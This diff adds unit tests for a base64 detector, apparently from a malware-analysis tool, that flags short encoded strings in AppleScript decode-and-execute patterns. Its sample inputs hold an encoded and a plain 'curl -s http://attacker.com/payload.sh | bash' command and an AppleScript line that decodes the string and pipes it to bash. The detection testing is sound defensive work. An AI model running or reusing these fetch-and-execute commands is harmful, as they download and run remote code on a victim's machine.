@@ -18,6 +18,8 @@ const { loadModules } = require('../helpers/load-bundle.js');
 const ctx = loadModules([
   'src/constants.js',
   'src/encoded-content-detector.js',
+  'src/decoders/whitelist.js',
+  'src/decoders/entropy.js',
   'src/decoders/base64-hex.js',
 ]);
 const { EncodedContentDetector } = ctx;
@@ -105,4 +107,75 @@ test('base64-hex: _decodeBase32 returns null for non-Base32 chars', () => {
   // `8`, `9`, lowercase letters that aren't normalised) is rejected
   // via the `alphabet.indexOf(ch) === -1` gate, returning null.
   assert.equal(detector._decodeBase32('00000000'), null);
+});
+
+// ── AppleScript base64-decode-var rescue pass ─────────────────────────────
+
+test('base64-hex: AppleScript rescue emits 60-char b64 in `set X to "…"` + `base64 -D` context', () => {
+  // The default-mode length floor is 64 chars. A real-world
+  // AppleScript malware pattern looks like:
+  //
+  //   set b64 to "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo"
+  //   do shell script "echo " & b64 & " | base64 -D | bash"
+  //
+  // The base64 is 60 chars — below the floor. Without the rescue, no
+  // top-level Base64 finding emits, so the embedded URL IOC never
+  // surfaces until the analyst clicks "Load for analysis" on the
+  // AppleScript shell-sink finding. The rescue detects the
+  // `set <var> to "…"` preamble + downstream `<var> … base64 -D` usage
+  // and promotes the candidate to high-confidence.
+  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo'; // 60 chars
+  const text =
+    `set b64 to "${b64}"\n` +
+    `do shell script "echo " & b64 & " | base64 -D | bash"`;
+  const cands = detector._findBase64Candidates(text, {});
+  const hit = cands.find(c => c.raw === b64);
+  assert.ok(hit, `expected base64 rescue candidate; got: ${JSON.stringify(cands)}`);
+  assert.equal(hit.confidence, 'high');
+  assert.equal(hit.autoDecoded, true);
+  assert.equal(hit.hint, 'AppleScript base64-decode variable');
+});
+
+test('base64-hex: AppleScript rescue does NOT fire when downstream has no base64 -D', () => {
+  // Conservative gate: the rescue must see a `base64 -D|-d|--decode`
+  // pipeline downstream. A bare quoted 60-char blob without the
+  // downstream context stays below the 64-char floor.
+  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
+  const text =
+    `set b64 to "${b64}"\n` +
+    `do shell script "echo " & b64 & " | cat"`;
+  const cands = detector._findBase64Candidates(text, {});
+  const hit = cands.find(c => c.raw === b64);
+  assert.equal(hit, undefined,
+    `no base64 -D context → rescue must not fire; got: ${JSON.stringify(cands)}`);
+});
+
+test('base64-hex: AppleScript rescue requires `set` preamble (skips bare quoted blobs)', () => {
+  // The rescue trigger is specifically `set <var> to "<b64>"`. A bare
+  // quoted 60-char blob not bound to a named variable doesn't get
+  // rescued — even if `base64 -D` appears elsewhere in the file.
+  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
+  const text =
+    `display dialog "${b64}"\n` +
+    `do shell script "echo something | base64 -D | bash"`;
+  const cands = detector._findBase64Candidates(text, {});
+  const hit = cands.find(c => c.raw === b64);
+  assert.equal(hit, undefined,
+    `bare quoted b64 without set-preamble must not rescue; got: ${JSON.stringify(cands)}`);
+});
+
+test('base64-hex: AppleScript rescue decodes the candidate to the expected curl-pipe-shell cleartext', () => {
+  // End-to-end: the rescued candidate's raw bytes round-trip through
+  // the `_decodeBase64` path to the original curl-pipe-bash string.
+  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
+  const text =
+    `set b64 to "${b64}"\n` +
+    `do shell script "echo " & b64 & " | base64 -D | bash"`;
+  const cands = detector._findBase64Candidates(text, {});
+  const hit = cands.find(c => c.raw === b64);
+  assert.ok(hit, 'rescue candidate must emit');
+  const decoded = detector._decodeBase64(hit.raw);
+  assert.ok(decoded instanceof ctx.Uint8Array);
+  assert.equal(bytesToAscii(decoded),
+    'curl -s http://attacker.com/payload.sh | bash');
 });
